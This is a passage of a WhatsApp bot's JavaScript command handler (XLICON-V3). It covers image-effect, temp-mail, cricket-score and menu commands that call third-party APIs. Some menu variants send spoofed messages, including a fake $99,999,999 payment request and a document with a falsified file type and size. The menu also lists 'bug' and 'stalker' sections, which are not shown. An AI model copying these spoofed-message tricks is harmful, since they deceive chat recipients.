      // < For hitler>

      case "hitler":
      case "hitlerimage":
        {
          if (!isMedia) return replygcXlicon("Where Is The Image");
          let media = await XliconBotInc.downloadAndSaveMediaMessage(quoted);
          let anu = await TelegraPh(media);
          XliconBotInc.sendMessage(
            m.chat,
            {
              image: {
                url: `https://api-smd-1.vercel.app/api/maker/hitler?url=${anu}`,
              },
              caption: "➫ 𝐆𝐞𝐧𝐞𝐫𝐚𝐭𝐞𝐝 𝐁𝐲 𝐗𝐋𝐈𝐂𝐎𝐍-𝐕𝟑�",
            },
            { quoted: m }
          );
        }
        break;

      // < For trash>

      case "trash":
      case "trashimage":
        {
          if (!isMedia) return replygcXlicon("Where Is The Image");
          let media = await XliconBotInc.downloadAndSaveMediaMessage(quoted);
          let anu = await TelegraPh(media);
          XliconBotInc.sendMessage(
            m.chat,
            {
              image: {
                url: `https://api-smd-1.vercel.app/api/maker/trash?url=${anu}`,
              },
              caption: "➫ 𝐆𝐞𝐧𝐞𝐫𝐚𝐭𝐞𝐝 𝐁𝐲 𝐗𝐋𝐈𝐂𝐎𝐍-𝐕𝟑�",
            },
            { quoted: m }
          );
        }
        break;

      // < For rip>

      case "rip":
      case "ripimage":
        {
          if (!isMedia) return replygcXlicon("Where Is The Image");
          let media = await XliconBotInc.downloadAndSaveMediaMessage(quoted);
          let anu = await TelegraPh(media);
          XliconBotInc.sendMessage(
            m.chat,
            {
              image: {
                url: `https://api-smd-1.vercel.app/api/maker/rip?url=${anu}`,
              },
              caption: "➫ 𝐆𝐞𝐧𝐞𝐫𝐚𝐭𝐞𝐝 𝐁𝐲 𝐗𝐋𝐈𝐂𝐎𝐍-𝐕𝟑�",
            },
            { quoted: m }
          );
        }
        break;

      // < For greyscale>

      case "greyscale":
      case "greyimage":
        {
          if (!isMedia) return replygcXlicon("Where Is The Image");
          let media = await XliconBotInc.downloadAndSaveMediaMessage(quoted);
          let anu = await TelegraPh(media);
          XliconBotInc.sendMessage(
            m.chat,
            {
              image: {
                url: `https://api-smd-1.vercel.app/api/maker/greyscale?url=${anu}`,
              },
              caption: "➫ 𝐆𝐞𝐧𝐞𝐫𝐚𝐭𝐞𝐝 𝐁𝐲 𝐗𝐋𝐈𝐂𝐎𝐍-𝐕𝟑�",
            },
            { quoted: m }
          );
        }
        break;

      // < For sepia>

      case "sepia":
      case "sepiaimage":
        {
          if (!isMedia) return replygcXlicon("Where Is The Image");
          let media = await XliconBotInc.downloadAndSaveMediaMessage(quoted);
          let anu = await TelegraPh(media);
          XliconBotInc.sendMessage(
            m.chat,
            {
              image: {
                url: `https://api-smd-1.vercel.app/api/maker/sepia?url=${anu}`,
              },
              caption: "➫ 𝐆𝐞𝐧𝐞𝐫𝐚𝐭𝐞𝐝 𝐁𝐲 𝐗𝐋𝐈𝐂𝐎𝐍-𝐕𝟑�",
            },
            { quoted: m }
          );
        }
        break;

      // < For shit>

      case "shit":
      case "shitimage":
        {
          if (!isMedia) return replygcXlicon("Where Is The Image");
          let media = await XliconBotInc.downloadAndSaveMediaMessage(quoted);
          let anu = await TelegraPh(media);
          XliconBotInc.sendMessage(
            m.chat,
            {
              image: {
                url: `https://api-smd-1.vercel.app/api/maker/shit?url=${anu}`,
              },
              caption: "➫ 𝐆𝐞𝐧𝐞𝐫𝐚𝐭𝐞𝐝 𝐁𝐲 𝐗𝐋𝐈𝐂𝐎𝐍-𝐕𝟑�",
            },
            { quoted: m }
          );
        }
        break;

      // < For circle>

      case "circle":
      case "circleimage":
        {
          if (!isMedia) return replygcXlicon("Where Is The Image");
          let media = await XliconBotInc.downloadAndSaveMediaMessage(quoted);
          let anu = await TelegraPh(media);
          XliconBotInc.sendMessage(
            m.chat,
            {
              image: {
                url: `https://api-smd-1.vercel.app/api/maker/circle?url=${anu}`,
              },
              caption: "➫ 𝐆𝐞𝐧𝐞𝐫𝐚𝐭𝐞𝐝 𝐁𝐲 𝐗𝐋𝐈𝐂𝐎𝐍-𝐕𝟑�",
            },
            { quoted: m }
          );
        }
        break;

      // < For reply>

      case "reply":
      case "replyimage":
        {
          if (!isMedia) return replygcXlicon("Where Is The Image");
          let media = await XliconBotInc.downloadAndSaveMediaMessage(quoted);
          let anu = await TelegraPh(media);
          XliconBotInc.sendMessage(
            m.chat,
            {
              image: {
                url: `https://api-smd-1.vercel.app/api/maker/reply?image1=${anu}`,
              },
              caption: "➫ 𝐆𝐞𝐧𝐞𝐫𝐚𝐭𝐞𝐝 𝐁𝐲 𝐗𝐋𝐈𝐂𝐎𝐍-𝐕𝟑�",
            },
            { quoted: m }
          );
        }
        break;

      // < For guildIcon>

      case "guildicon":
      case "guildimage":
        {
          if (!isMedia) return replygcXlicon("Where Is The Image");
          let media = await XliconBotInc.downloadAndSaveMediaMessage(quoted);
          let anu = await TelegraPh(media);
          XliconBotInc.sendMessage(
            m.chat,
            {
              image: {
                url: `https://api-smd-1.vercel.app/api/maker/guildIcon?name=${anu}`,
              },
              caption: "➫ 𝐆𝐞𝐧𝐞𝐫𝐚𝐭𝐞𝐝 𝐁𝐲 𝐗𝐋𝐈𝐂𝐎𝐍-𝐕𝟑�",
            },
            { quoted: m }
          );
        }
        break;

      // < For phub>

      case "phub":
      case "phubimage":
        {
          if (!isMedia) return replygcXlicon("Where Is The Image");
          let media = await XliconBotInc.downloadAndSaveMediaMessage(quoted);
          let anu = await TelegraPh(media);
          XliconBotInc.sendMessage(
            m.chat,
            {
              image: {
                url: `https://api-smd-1.vercel.app/api/maker/phub?message=hiiiii&name=SalmanSer&image=${anu}`,
              },
              caption: "➫ 𝐆𝐞𝐧𝐞𝐫𝐚𝐭𝐞𝐝 𝐁𝐲 𝐗𝐋𝐈𝐂𝐎𝐍-𝐕𝟑�",
            },
            { quoted: m }
          );
        }
        break;
      //temp mails
      case "tempmail":
      case "tmg":
        {
          let res = await fetchJson(
            "https://api.maher-zubair.tech/misc/tempmail"
          );
          replygcXlicon(
            `*Temp Mail Generated*\n\n*Email*: ${res.result[0]}\n*ID*: ${res.result[1]}\n\nPlease use the *ID* to check emails. Example: ${prefix}tempib U2Vzc2lvbjqAMoScnm9KVZARWDpGFMBn`
          );
        }
        break;
      case "tempinbox":
      case "tib":
        {
          if (!args[0]) {
            return replygcXlicon(
              `Specify valid temp mail ID. Type ${prefix}tempmail to generate one...`
            );
          }
          async function getInboxData(qParam) {
            try {
              const response = await fetch(
                `https://api.maher-zubair.tech/misc/get_inbox_tempmail?q=${qParam}`
              );
              const data = await response.json();
              return data;
            } catch (error) {
              return replygcXlicon(`API is currently down. Try again later...`);
            }
          }
          getInboxData(args[0]).then((data) => {
            console.log(data);
            if (!data.result) {
              return replygcXlicon("Invalid ID. Enter correct Temp Mail ID.");
            }
            if (data.result[1] == 0) {
              return replygcXlicon("Your Inbox is Empty...");
            }
            const emails = data.result[0];
            let outputMessage = "INBOX:\n";
            emails.forEach((email, index) => {
              outputMessage += `\n*Email ${index + 1}:*\n`;
              outputMessage += `* From: ${email.fromAddr}\n`;
              outputMessage += `* To: ${email.toAddr}\n`;
              outputMessage += `* Subject: ${email.headerSubject}\n`;
              outputMessage += `* Text: ${email.text}\n`;
              outputMessage += `* Download: ${email.downloadUrl}\n`;
            });
            replygcXlicon(outputMessage);
          });
        }
        break;
      //cricket
      case "matches":
      case "match":
      case "cricket":
        {
          let res = await fetchJson(`https://api-smd-1.vercel.app/api/match`);
          const matches = res.results;
          console.log(matches);

          let outputMessage = ""; // Initialize the output message
          matches.forEach((match) => {
            // Change 'matches' to 'match'
            outputMessage += `* ${match.title}\n`;
            outputMessage += `* URL: ${match.link}\n`;
          });
          replygcXlicon(
            `${outputMessage}\n\nType *${prefix}score cricbuzz link* to get detailed result...`
          );
        }
        break;
      case "scores":
      case "score":
        {
          if (!args[0]) {
            return replygcXlicon(
              `Cricbuzz match Link is required. Type *${prefix}matches* to get links...`
            );
          }
          let res = await fetchJson(
            `https://api-smd-1.vercel.app/api/score?url=${args[0]}`
          );
          if (res.error) {
            ("No Data Found or Invalid URL...");
          }
          let txt = `*${res.results.names}*\n\n${res.results.details[0]}\n${res.results.details[1]}\n${res.results.details[2]}\n\n*Summary*: ${res.results.preview}`;
          replygcXlicon(txt);
        }
        break;
      // < For quote>

      case "quote":
      case "quoteimage":
        {
          if (!isMedia) return replygcXlicon("Where Is The Image");

          let media = await XliconBotInc.downloadAndSaveMediaMessage(quoted);
          let anu = await TelegraPh(media);
          XliconBotInc.sendMessage(
            m.chat,
            {
              image: {
                url: `https://api-smd-1.vercel.app/api/maker/quote?message=hiiiii&name=SalmanSer&image=${anu}`,
              },
              caption: "➫ 𝐆𝐞𝐧𝐞𝐫𝐚𝐭𝐞𝐝 𝐁𝐲 𝐗𝐋𝐈𝐂𝐎𝐍-𝐕𝟑�",
            },
            { quoted: m }
          );
        }
        break;

      // < For clyde>

      case "clyde":
      case "clydeimage":
        {
          if (!isMedia) return replygcXlicon("Where Is The Image");
          let media = await XliconBotInc.downloadAndSaveMediaMessage(quoted);
          let anu = await TelegraPh(media);
          XliconBotInc.sendMessage(
            m.chat,
            {
              image: {
                url: `https://api-smd-1.vercel.app/api/maker/clyde?message=hiiiii&name=SalmanSer&image=${anu}`,
              },
              caption: "➫ 𝐆𝐞𝐧𝐞𝐫𝐚𝐭𝐞𝐝 𝐁𝐲 𝐗𝐋𝐈𝐂𝐎𝐍-𝐕𝟑�",
            },
            { quoted: m }
          );
        }
        break;

      // < For opinion>

      case "opinion":
      case "opinionimage":
        {
          if (!isMedia) return replygcXlicon("Where Is The Image");
          let media = await XliconBotInc.downloadAndSaveMediaMessage(quoted);
          let anu = await TelegraPh(media);
          XliconBotInc.sendMessage(
            m.chat,
            {
              image: {
                url: `https://api-smd-1.vercel.app/api/maker/opinion?message=hiiiii&name=SalmanSer&image=${anu}`,
              },
              caption: "➫ 𝐆𝐞𝐧𝐞𝐫𝐚𝐭𝐞𝐝 𝐁𝐲 𝐗𝐋𝐈𝐂𝐎𝐍-𝐕𝟑�",
            },
            { quoted: m }
          );
        }
        break;

      // < For bed>

      case "bed":
      case "bedimage":
        {
          if (!isMedia) return replygcXlicon("Where Is The Image");
          let media = await XliconBotInc.downloadAndSaveMediaMessage(quoted);
          let anu = await TelegraPh(media);
          XliconBotInc.sendMessage(
            m.chat,
            {
              image: {
                url: `https://api-smd-1.vercel.app/api/maker/bed?image1=${anu}`,
              },
              caption: "➫ 𝐆𝐞𝐧𝐞𝐫𝐚𝐭𝐞𝐝 𝐁𝐲 𝐗𝐋𝐈𝐂𝐎𝐍-𝐕𝟑�",
            },
            { quoted: m }
          );
        }
        break;

      case "kissimage":
        {
          if (!isMedia) return replygcXlicon("Where Is The Image");
          let media = await XliconBotInc.downloadAndSaveMediaMessage(quoted);
          let anu = await TelegraPh(media);
          XliconBotInc.sendMessage(
            m.chat,
            {
              image: {
                url: `https://api-smd-1.vercel.app/api/maker/kiss?image1=${anu}`,
              },
              caption: "➫ 𝐆𝐞𝐧𝐞𝐫𝐚𝐭𝐞𝐝 𝐁𝐲 𝐗𝐋𝐈𝐂𝐎𝐍-𝐕𝟑�",
            },
            { quoted: m }
          );
        }
        break;

      // < For fuse>

      case "fuse":
      case "fuseimage":
        {
          if (!isMedia) return replygcXlicon("Where Is The Image");
          let media = await XliconBotInc.downloadAndSaveMediaMessage(quoted);
          let anu = await TelegraPh(media);
          XliconBotInc.sendMessage(
            m.chat,
            {
              image: {
                url: `https://api-smd-1.vercel.app/api/maker/fuse?image1=${anu}`,
              },
              caption: "➫ 𝐆𝐞𝐧𝐞𝐫𝐚𝐭𝐞𝐝 𝐁𝐲 𝐗𝐋𝐈𝐂𝐎𝐍-𝐕𝟑�",
            },
            { quoted: m }
          );
        }
        break;

      // < For enhance >
      case "enhance":
        {
          if (!isMedia) return replygcXlicon("Where Is The Image");
          let media = await XliconBotInc.downloadAndSaveMediaMessage(quoted);
          let anu = await TelegraPh(media);
          XliconBotInc.sendMessage(
            m.chat,
            {
              image: {
                url: `https://api.maher-zubair.tech/maker/enhance?url=${anu}`,
              },
              caption: "➫ 𝐆𝐞𝐧𝐞𝐫𝐚𝐭𝐞𝐝 𝐁𝐲 𝐗𝐋𝐈𝐂𝐎𝐍-𝐕𝟑�",
            },
            { quoted: m }
          );
        }
        break;

      // < For dehaze >
      case "dehaze":
        {
          if (!isMedia) return replygcXlicon("Where Is The Image");
          let media = await XliconBotInc.downloadAndSaveMediaMessage(quoted);
          let anu = await TelegraPh(media);
          XliconBotInc.sendMessage(
            m.chat,
            {
              image: {
                url: `https://api.maher-zubair.tech/maker/dehaze?url=${anu}`,
              },
              caption: "➫ 𝐆𝐞𝐧𝐞𝐫𝐚𝐭𝐞𝐝 𝐁𝐲 𝐗𝐋𝐈𝐂𝐎𝐍-𝐕𝟑�",
            },
            { quoted: m }
          );
        }
        break;

      case "totalfeature":
      case "totalfitur":
      case "totalcmd":
      case "totalcommand":
        replygcXlicon(`Total Features of ${botname} is ${Xliconfeature()}`);
        break;
      case "menu":
      case "help":
        {
          let ownernya = ownernumber + "@s.whatsapp.net";
          let timestampe = speed();
          let latensie = speed() - timestampe;
          let a = db.data.users[sender];
          let me = m.sender;
          let mot = pickRandom(["⌬", "⏣", "❐", "❑", "➛", "✧", "✯"]);
          let xmenu_oh = `
┌─❖
│ *_Hi_* _Senpai_ 👋 
└┬❖  ${pushname} 
 ✑  ${xeonytimewisher} 😄 
  └────────────┈ ▱╼❲⭐❳
${readmore}

 ⏤͟͟͞͞★ 𝐁𝐎𝐓 𝐔𝐒𝐄𝐑 ꗄ➺
 
${mot} 𝗕𝗼𝘁 : ${botname}
${mot} 𝗢𝘄𝗻𝗲𝗿 𝗡𝗼: +${ownernumber}
${mot} 𝗣𝗿𝗲𝗳𝗶𝘅 :  [ ${xprefix} ]
${mot} 𝗠𝗼𝗱𝗲 : ${XliconBotInc.public ? "Public" : `Self`}
${mot} 𝗣𝗹𝘂𝗴𝗶𝗻𝘀: ${Xliconfeature()}
${mot} 𝗦𝗽𝗲𝗲𝗱 : ${latensie.toFixed(4)} miliseconds
${mot} 𝗥𝘂𝗻𝘁𝗶𝗺𝗲 : ${runtime(process.uptime())}
${mot} 𝗛𝗼𝘀𝘁 𝗡𝗮𝗺𝗲 : *_SalmanSer Server_*
${mot} 𝗣𝗹𝗮𝘁𝗳𝗼𝗿𝗺 : ${os.platform()}
${mot} 𝗧𝗼𝘁𝗮𝗹 𝗨𝘀𝗲𝗿 : ${Object.keys(global.db.data.users).length} User
${mot} 𝗧𝗼𝘁𝗮𝗹 𝗛𝗶𝘁 : ${global.db.data.settings[botNumber].totalhit} Hit
${mot} 𝗧𝗼𝘁𝗮𝗹 𝗖𝗵𝗮𝘁 : ${Object.keys(global.db.data.chats).length} Chat/Gc


 ⏤͟͟͞͞★ 𝐈𝐍𝐅𝐎 𝐔𝐒𝐄𝐑 ꗄ➺

${mot} 𝗡𝗮𝗺𝗲 : ${pushname}
${mot} 𝗡𝘂𝗺𝗯𝗲𝗿 : +${me.split("@")[0]}
${mot} 𝗟𝗶𝗺𝗶𝘁 : ${a.limit}
${mot} 𝗧𝗶𝘁𝗹𝗲 : ${a.title ? a.title : "-"}
${mot} 𝗦𝗲𝗿𝗶𝗮𝗹: ${a.serialNumber}

 
⏤͟͟͞͞★ 𝐓𝐈𝐌𝐄 𝐈𝐍𝐅𝐎 ꗄ➺ 

${mot} 𝗧𝗶𝗺𝗲 : ${xtime}
${mot} 𝗗𝗮𝘁𝗲 : ${xdate}

⌕ ❙❘❙❙❘❙❚❙❘❙❙❚❙❘❙❘❙❚❙❘❙❙❚❙❘❙❙❘❙❚❙❘ ⌕
   
│✑  Please Type The *MENU*
│✑  Given *BELOW*
   
    『 *_MENU_* 』
    
╭⏤͟͟͞͞★
│➛ ${xprefix}ᴀʟʟᴍᴇɴᴜ
│➛ ${xprefix}ᴅᴏᴡɴʟᴏᴀᴅᴍᴇɴᴜ
│➛ ${xprefix}ғᴜɴᴍᴇɴᴜ
│➛ ${xprefix}ᴀɪᴍᴇɴᴜ
│➛ ${xprefix}ɢʀᴏᴜᴘᴍᴇɴᴜ
│➛ ${xprefix}ᴏᴡɴᴇʀᴍᴇɴᴜ
│➛ ${xprefix}ᴘʜᴏᴛᴏᴏxʏᴍᴇɴᴜ
│➛ ${xprefix}ᴇᴘʜᴏᴛᴏ360ᴍᴇɴᴜ
│➛ ${xprefix}ᴍᴀᴋᴇʀᴍᴇɴᴜ
│➛ ${xprefix}ᴀɴɪᴍᴇᴍᴇɴᴜ
│➛ ${xprefix}ʀᴀɴᴅᴏᴍᴘʜᴏᴛᴏᴍᴇɴᴜ
│➛ ${xprefix}ʀᴀɴᴅᴏᴍᴠɪᴅᴇᴏᴍᴇɴᴜ
│➛ ${xprefix}sᴛɪᴄᴋᴇʀᴍᴇɴᴜ
│➛ ${xprefix}ᴅᴀᴛᴀʙᴀsᴇᴍᴇɴᴜ
│➛ ${xprefix}sᴛᴀʟᴋᴇʀᴍᴇɴᴜ
│➛ ${xprefix}ʙᴜɢᴍᴇɴᴜ
│➛ ${xprefix}ᴏᴛʜᴇʀᴍᴇɴᴜ
╰▱╼❲⭐❳`;
          if (typemenu === "v1") {
            XliconBotInc.sendMessage(
              m.chat,
              {
                image: fs.readFileSync("./XliconMedia/theme/xliconpic.jpg"),
                caption: xmenu_oh,
              },
              {
                quoted: m,
              }
            );
          } else if (typemenu === "v2") {
            XliconBotInc.sendMessage(
              m.chat,
              {
                text: xmenu_oh,
                contextInfo: {
                  externalAdReply: {
                    showAdAttribution: true,
                    title: botname,
                    body: ownername,
                    thumbnail: fs.readFileSync(
                      "./XliconMedia/theme/xliconpic.jpg"
                    ),
                    sourceUrl: wagc,
                    mediaType: 1,
                    renderLargerThumbnail: true,
                  },
                },
              },
              {
                quoted: m,
              }
            );
          }
          if (typemenu === "v3") {
            XliconBotInc.sendMessage(
              m.chat,
              {
                video: fs.readFileSync("./XliconMedia/theme/xliconvid.mp4"),
                caption: xmenu_oh,
              },
              {
                quoted: m,
              }
            );
          } else if (typemenu === "v4") {
            XliconBotInc.sendMessage(
              m.chat,
              {
                video: fs.readFileSync("./XliconMedia/theme/xliconvid2.mp4"),
                caption: xmenu_oh,
                gifPlayback: true,
              },
              {
                quoted: m,
              }
            );
          } else if (typemenu === "v5") {
            XliconBotInc.relayMessage(
              m.chat,
              {
                scheduledCallCreationMessage: {
                  callType: "AUDIO",
                  scheduledTimestampMs: 1200,
                  title: xmenu_oh,
                },
              },
              {}
            );
          } else if (typemenu === "v6") {
            XliconBotInc.relayMessage(
              m.chat,
              {
                requestPaymentMessage: {
                  currencyCodeIso4217: "USD",
                  amount1000: "9999999900",
                  requestFrom: m.sender,
                  noteMessage: {
                    extendedTextMessage: {
                      text: xmenu_oh,
                      contextInfo: {
                        externalAdReply: {
                          showAdAttribution: true,
                        },
                      },
                    },
                  },
                },
              },
              {}
            );
          } else if (typemenu === "v7") {
            XliconBotInc.sendMessage(
              m.chat,
              {
                document: {
                  url: "https://i.ibb.co/2W0H9Jq/avatar-contact.png",
                },
                caption: xmenu_oh,
                mimetype: "application/zip",
                fileName: ownername,
                fileLength: "99999999999",
                contextInfo: {
                  externalAdReply: {
                    showAdAttribution: true,
                    title: botname,
                    body: ownername,
                    thumbnail: fs.readFileSync(
                      "./XliconMedia/theme/xliconpic.jpg"
                    ),
                    sourceUrl: wagc,
                    mediaType: 1,
                    renderLargerThumbnail: true,
                  },
                },
              },
              {
                quoted: fstatus,
              }
            );
          } else if (typemenu === "v8") {
            XliconBotInc.sendMessage(
              m.chat,
              {
                video: fs.readFileSync("./XliconMedia/theme/xliconvid3.mp4"),
                gifPlayback: true,
                caption: xmenu_oh,
                contextInfo: {
                  externalAdReply: {
                    title: botname,
                    body: ownername,
                    thumbnailUrl: "https://i.ibb.co/c8JJBZZ/peakpx-2.jpg",
                    sourceUrl: ``,
                    mediaType: 1,
                    renderLargerThumbnail: true,
                  },
                },
              },
              {
                quoted: m,
              }
            );
          }
        }
        break;
      case "allmenu":
        {
          let xmenu_oh = `*_HI_*...👋🏻 *${pushname}*

┌⟝———ᙍ ɪɴꜰᴏ ᙊ
┃ *ʙᴏᴛ ɴᴀᴍᴇ* : ${botname}
┃ *ᴘʟᴜɢɪɴs* : ${Xliconfeature()}
┃ *ᴘʀᴇғɪx* :  [ ${prefix} ]
┃ *ᴠᴇʀsɪᴏɴ* : 3.0.5
┃ *ᴍᴏᴅᴇ* : ${XliconBotInc.public ? "Public" : `Self`}
┃ *ᴛʏᴘᴇ sᴄʀɪᴘᴛ* : ɴᴏᴅᴇ_ᴊs
┃ *ʜᴏsᴛ* : ᴋᴀʟɪʟɪɴᴜx
└⟝————ᙍᙊ
        \n${readmore}\n\n${allmenu(prefix, hituet)}`;
          if (typemenu === "v1") {
            XliconBotInc.sendMessage(
              m.chat,
              {
                image: fs.readFileSync("./XliconMedia/theme/xliconpic.jpg"),
                caption: xmenu_oh,
              },
              {
                quoted: m,
              }
            );
          } else if (typemenu === "v2") {
            XliconBotInc.sendMessage(
              m.chat,
              {
                text: xmenu_oh,
                contextInfo: {
                  externalAdReply: {
                    showAdAttribution: true,
                    title: botname,
                    body: ownername,
                    thumbnail: fs.readFileSync(
                      "./XliconMedia/theme/xliconpic.jpg"
                    ),
                    sourceUrl: wagc,
                    mediaType: 1,
                    renderLargerThumbnail: true,
                  },
                },
              },
              {
                quoted: m,
              }
            );
          }
          if (typemenu === "v3") {
            XliconBotInc.sendMessage(
              m.chat,
              {
                video: fs.readFileSync("./XliconMedia/theme/xliconvid.mp4"),
                caption: xmenu_oh,
              },
              {
                quoted: m,
              }
            );
          } else if (typemenu === "v4") {
            XliconBotInc.sendMessage(
              m.chat,
              {
                video: fs.readFileSync("./XliconMedia/theme/xliconvid2.mp4"),
                caption: xmenu_oh,
                gifPlayback: true,
              },
              {
                quoted: m,
              }
            );
          } else if (typemenu === "v5") {
            XliconBotInc.relayMessage(
              m.chat,
              {
                scheduledCallCreationMessage: {
                  callType: "AUDIO",
                  scheduledTimestampMs: 1200,
                  title: xmenu_oh,
                },
              },
              {}
            );
          } else if (typemenu === "v6") {
            XliconBotInc.relayMessage(
              m.chat,
              {
                requestPaymentMessage: {
                  currencyCodeIso4217: "USD",
                  amount1000: "9999999900",
                  requestFrom: m.sender,
                  noteMessage: {
                    extendedTextMessage: {
                      text: xmenu_oh,
                      contextInfo: {
                        externalAdReply: {
                          showAdAttribution: true,
                        },
                      },
                    },
                  },
                },
              },
              {}
            );
          } else if (typemenu === "v7") {
            XliconBotInc.sendMessage(
              m.chat,
              {
                document: {
                  url: "https://i.ibb.co/2W0H9Jq/avatar-contact.png",
                },
                caption: xmenu_oh,
                mimetype: "application/zip",
                fileName: ownername,
                fileLength: "99999999999",
                contextInfo: {
                  externalAdReply: {
                    showAdAttribution: true,
                    title: botname,
                    body: ownername,
                    thumbnail: fs.readFileSync(
                      "./XliconMedia/theme/xliconpic.jpg"
                    ),
                    sourceUrl: wagc,
                    mediaType: 1,
                    renderLargerThumbnail: true,
                  },
                },
              },
              {
                quoted: fstatus,
              }
            );
          } else if (typemenu === "v8") {
            XliconBotInc.sendMessage(
              m.chat,
              {
                video: fs.readFileSync("./XliconMedia/theme/xliconvid3.mp4"),
                gifPlayback: true,
                caption: xmenu_oh,
                contextInfo: {
                  externalAdReply: {
                    title: botname,
                    body: ownername,
                    thumbnailUrl: "https://i.ibb.co/c8JJBZZ/peakpx-2.jpg",
                    sourceUrl: ``,
                    mediaType: 1,
                    renderLargerThumbnail: true,
                  },
                },
              },
              {
                quoted: m,
              }
            );
          }
        }
        break;
      case "ownermenu":
        {
          let xmenu_oh = `Hi ${pushname}${readmore}\n\n${ownermenu(
            prefix,
            hituet
          )}`;
          if (typemenu === "v1") {
            XliconBotInc.sendMessage(
              m.chat,
              {
                image: fs.readFileSync("./XliconMedia/theme/xliconpic.jpg"),
                caption: xmenu_oh,
              },
              {
                quoted: m,
              }
            );
          } else if (typemenu === "v2") {
            XliconBotInc.sendMessage(
              m.chat,
              {
                text: xmenu_oh,
                contextInfo: {
                  externalAdReply: {
                    showAdAttribution: true,
                    title: botname,
                    body: ownername,
                    thumbnail: fs.readFileSync(
                      "./XliconMedia/theme/xliconpic.jpg"
                    ),
                    sourceUrl: wagc,
                    mediaType: 1,
                    renderLargerThumbnail: true,
                  },
                },
              },
              {
                quoted: m,
              }
            );
          }
          if (typemenu === "v3") {
            XliconBotInc.sendMessage(
              m.chat,
              {
                video: fs.readFileSync("./XliconMedia/theme/xliconvid.mp4"),
                caption: xmenu_oh,
              },
              {
                quoted: m,
              }
            );
          } else if (typemenu === "v4") {
            XliconBotInc.sendMessage(
              m.chat,
              {
                video: fs.readFileSync("./XliconMedia/theme/xliconvid2.mp4"),
                caption: xmenu_oh,
                gifPlayback: true,
              },
              {
                quoted: m,
              }
            );
          } else if (typemenu === "v5") {
            XliconBotInc.relayMessage(
              m.chat,
              {
                scheduledCallCreationMessage: {
                  callType: "AUDIO",
                  scheduledTimestampMs: 1200,
                  title: xmenu_oh,
                },
              },
              {}
            );
          } else if (typemenu === "v6") {
            XliconBotInc.relayMessage(
              m.chat,
              {
                requestPaymentMessage: {
                  currencyCodeIso4217: "USD",
                  amount1000: "9999999900",
                  requestFrom: m.sender,
                  noteMessage: {
                    extendedTextMessage: {
                      text: xmenu_oh,
                      contextInfo: {
                        externalAdReply: {
                          showAdAttribution: true,
                        },
                      },
                    },
                  },
                },
              },
              {}
            );
          } else if (typemenu === "v7") {
            XliconBotInc.sendMessage(
              m.chat,
              {
                document: {
                  url: "https://i.ibb.co/2W0H9Jq/avatar-contact.png",
                },
                caption: xmenu_oh,
                mimetype: "application/zip",
                fileName: ownername,
                fileLength: "99999999999",
                contextInfo: {
                  externalAdReply: {
                    showAdAttribution: true,
                    title: botname,
                    body: ownername,
                    thumbnail: fs.readFileSync(
                      "./XliconMedia/theme/xliconpic.jpg"
                    ),
                    sourceUrl: wagc,
                    mediaType: 1,
                    renderLargerThumbnail: true,
                  },
                },
              },
              {
                quoted: fstatus,
              }
            );
          } else if (typemenu === "v8") {
            XliconBotInc.sendMessage(
              m.chat,
              {
                video: fs.readFileSync("./XliconMedia/theme/xliconvid3.mp4"),
                gifPlayback: true,
                caption: xmenu_oh,
                contextInfo: {
                  externalAdReply: {
                    title: botname,
                    body: ownername,
                    thumbnailUrl: "https://i.ibb.co/c8JJBZZ/peakpx-2.jpg",
                    sourceUrl: ``,
                    mediaType: 1,
                    renderLargerThumbnail: true,
                  },
                },
              },
              {
                quoted: m,
              }
            );
          }
        }
        break;
      case "othermenu":
        {
          let xmenu_oh = `Hi ${pushname}${readmore}\n\n${othermenu(
            prefix,
            hituet
          )}`;
          if (typemenu === "v1") {
            XliconBotInc.sendMessage(
              m.chat,
              {
                image: fs.readFileSync("./XliconMedia/theme/xliconpic.jpg"),
                caption: xmenu_oh,
              },
              {
                quoted: m,
              }
            );
          } else if (typemenu === "v2") {
            XliconBotInc.sendMessage(
              m.chat,
              {
                text: xmenu_oh,
                contextInfo: {
                  externalAdReply: {
                    showAdAttribution: true,
                    title: botname,
                    body: ownername,
                    thumbnail: fs.readFileSync(
                      "./XliconMedia/theme/xliconpic.jpg"
                    ),
                    sourceUrl: wagc,
                    mediaType: 1,
                    renderLargerThumbnail: true,
                  },
                },
              },
              {
                quoted: m,
              }
            );
          }
          if (typemenu === "v3") {
            XliconBotInc.sendMessage(
              m.chat,
              {
                video: fs.readFileSync("./XliconMedia/theme/xliconvid.mp4"),
                caption: xmenu_oh,
              },
              {
                quoted: m,
              }
            );
          } else if (typemenu === "v4") {
            XliconBotInc.sendMessage(
              m.chat,
              {
                video: fs.readFileSync("./XliconMedia/theme/xliconvid2.mp4"),
                caption: xmenu_oh,
                gifPlayback: true,
              },
              {
                quoted: m,
              }
            );
          } else if (typemenu === "v5") {
            XliconBotInc.relayMessage(
              m.chat,
              {
                scheduledCallCreationMessage: {
                  callType: "AUDIO",
                  scheduledTimestampMs: 1200,
                  title: xmenu_oh,
                },
              },
              {}
            );
          } else if (typemenu === "v6") {
            XliconBotInc.relayMessage(
              m.chat,
              {
                requestPaymentMessage: {
                  currencyCodeIso4217: "USD",
                  amount1000: "9999999900",
                  requestFrom: m.sender,
                  noteMessage: {
                    extendedTextMessage: {
                      text: xmenu_oh,
                      contextInfo: {
                        externalAdReply: {
                          showAdAttribution: true,
                        },
                      },
                    },
                  },
                },
              },
              {}
            );
          } else if (typemenu === "v7") {
            XliconBotInc.sendMessage(
              m.chat,
              {
                document: {
                  url: "https://i.ibb.co/2W0H9Jq/avatar-contact.png",
                },
                caption: xmenu_oh,
                mimetype: "application/zip",
                fileName: ownername,
                fileLength: "99999999999",
                contextInfo: {
                  externalAdReply: {
                    showAdAttribution: true,
                    title: botname,
                    body: ownername,
                    thumbnail: fs.readFileSync(
                      "./XliconMedia/theme/xliconpic.jpg"
                    ),
                    sourceUrl: wagc,
                    mediaType: 1,
                    renderLargerThumbnail: true,
                  },
                },
              },
              {
                quoted: fstatus,
              }
            );
          } else if (typemenu === "v8") {
            XliconBotInc.sendMessage(
              m.chat,
              {
                video: fs.readFileSync("./XliconMedia/theme/xliconvid3.mp4"),
                gifPlayback: true,
                caption: xmenu_oh,
                contextInfo: {
                  externalAdReply: {
                    title: botname,
                    body: ownername,
                    thumbnailUrl: "https://i.ibb.co/c8JJBZZ/peakpx-2.jpg",
                    sourceUrl: ``,
                    mediaType: 1,
                    renderLargerThumbnail: true,
                  },
                },
              },
              {
                quoted: m,
              }
            );
          }
        }
        break;
      case "downloadmenu":
      case "dlmenu":
        {
          let xmenu_oh = `Hi ${pushname}${readmore}\n\n${downloadmenu(
            prefix,
            hituet
          )}`;
